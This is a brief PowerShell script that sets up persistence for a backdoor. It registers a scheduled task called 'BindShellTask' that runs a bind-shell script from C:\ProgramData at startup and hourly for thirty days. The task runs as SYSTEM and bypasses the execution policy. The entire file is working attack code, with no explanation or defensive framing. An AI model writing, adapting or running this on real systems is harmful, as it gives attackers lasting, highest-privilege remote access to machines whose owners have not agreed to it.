# Action to execute the PowerShell script
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File C:\ProgramData\bindshell.ps1"

# Trigger for the task
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Trigger.RepetitionInterval = (New-TimeSpan -Hours 1)
$Trigger.RepetitionDuration = (New-TimeSpan -Days 30)

# Set principal to SYSTEM (No need for password if SYSTEM)
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount

# Create the task with the specified action, trigger, and principal
$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Description "Run Bind Shell Every Hour"

# Register the task
Register-ScheduledTask -TaskName "BindShellTask" -InputObject $Task
